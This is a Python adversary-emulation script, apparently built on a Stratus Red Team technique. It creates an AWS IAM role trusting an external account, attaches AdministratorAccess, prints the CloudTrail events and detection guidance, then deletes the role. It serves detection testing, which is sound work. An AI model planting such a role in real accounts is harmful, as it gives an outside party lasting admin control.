"""
Technique : aws.persistence.iam-create-backdoor-role
Tactic    : Persistence (T1098)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/

Pre-requisites:
  - None. The script creates and destroys its own IAM role.

How the attack works:
  An attacker with iam:CreateRole + iam:AttachRolePolicy creates a new IAM
  role whose trust policy allows a principal from an external AWS account
  (193672423079) to assume it.  AdministratorAccess is then attached, giving
  the attacker persistent admin access that survives password resets, access
  key rotations, or MFA changes on the compromised user.

Detection signal:
  - iam:CreateRole with an AssumeRolePolicyDocument containing an external
    account principal (not the same account or known federation).
  - iam:AttachRolePolicy with PolicyArn containing AdministratorAccess or
    similarly broad managed policies shortly after role creation.

Revert:
  - Automated: DetachRolePolicy + DeleteRole in the finally block.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import time

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

BACKDOOR_ROLE_NAME   = "stratus-red-team-backdoor-role"
ATTACKER_ACCOUNT_ID  = "193672423079"
ADMIN_POLICY_ARN     = "arn:aws:iam::aws:policy/AdministratorAccess"
DWELL_TIME_S         = 2


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    iam_client = session.client("iam")

    role_created   = False
    policy_attached = False

    try:
        # ── Step 1: Create backdoor role with cross-account trust ─────────────
        banner("Step 1 — Create IAM role trusting external account (CreateRole)")
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": f"arn:aws:iam::{ATTACKER_ACCOUNT_ID}:root"
                    },
                    "Action": "sts:AssumeRole",
                }
            ],
        }
        iam_client.create_role(
            RoleName=BACKDOOR_ROLE_NAME,
            AssumeRolePolicyDocument=json.dumps(trust_policy),
            Description="Stratus Red Team - backdoor role for adversary emulation",
            Tags=[
                {"Key": "StratusRedTeam",  "Value": "true"},
                {"Key": "Purpose",         "Value": "adversary-emulation"},
                {"Key": "Technique",       "Value": "aws.persistence.iam-create-backdoor-role"},
            ],
        )
        role_created = True
        print(f"  [+] Backdoor role created: {BACKDOOR_ROLE_NAME}")
        print(f"  [+] Trust policy grants sts:AssumeRole to account: {ATTACKER_ACCOUNT_ID}")
        print(f"  [!] CloudTrail event: iam:CreateRole")

        # ── Step 2: Attach AdministratorAccess ───────────────────────────────
        banner("Step 2 — Attach AdministratorAccess (AttachRolePolicy)")
        iam_client.attach_role_policy(
            RoleName=BACKDOOR_ROLE_NAME,
            PolicyArn=ADMIN_POLICY_ARN,
        )
        policy_attached = True
        print(f"  [+] Attached {ADMIN_POLICY_ARN}")
        print(f"  [!] CloudTrail event: iam:AttachRolePolicy")
        print(f"  [!] Attacker can now assume {BACKDOOR_ROLE_NAME} with full admin access.")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert ────────────────────────────────────────────────────────────
        banner("Revert — Cleaning up backdoor role")
        if policy_attached:
            try:
                iam_client.detach_role_policy(
                    RoleName=BACKDOOR_ROLE_NAME,
                    PolicyArn=ADMIN_POLICY_ARN,
                )
                print(f"  [+] Detached {ADMIN_POLICY_ARN}")
            except ClientError as exc:
                print(f"  [!] DetachRolePolicy failed: {exc}")

        if role_created:
            try:
                iam_client.delete_role(RoleName=BACKDOOR_ROLE_NAME)
                print(f"  [+] Deleted role: {BACKDOOR_ROLE_NAME}")
            except ClientError as exc:
                print(f"  [!] DeleteRole failed: {exc}")

    banner("Complete")
    print("CloudTrail events: iam:CreateRole, iam:AttachRolePolicy")
    print("\nDetection guidance:")
    print("  Alert when iam:CreateRole trust policy contains an external account")
    print("  principal, especially when followed by iam:AttachRolePolicy with")
    print("  AdministratorAccess or similarly broad policies.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
